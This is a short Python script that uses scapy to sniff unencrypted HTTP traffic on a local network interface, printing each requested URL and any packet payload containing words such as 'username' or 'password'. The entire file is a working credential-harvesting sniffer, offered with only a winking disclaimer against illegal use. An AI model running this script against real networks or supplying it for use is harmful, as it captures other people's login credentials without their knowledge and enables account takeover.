#!/usr/bin/env python
# -*- encoding: utf-8 -*-

##############################################################################
#                                                                            #
#                           By Wambugu   Dennis                              #
#                                                                            #
##############################################################################

# Disclaimer: Do Not Use this program for illegal purposes ;)
import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=sniffed_packet, filter="port 80")


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        words = ["Username", "user", "username", "uname", "login", "Password", "password", "pass"]
        for word_matched in words:
            if word_matched in load:
                return load


def sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request > " + url.decode())

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")


sniff("wlo1")
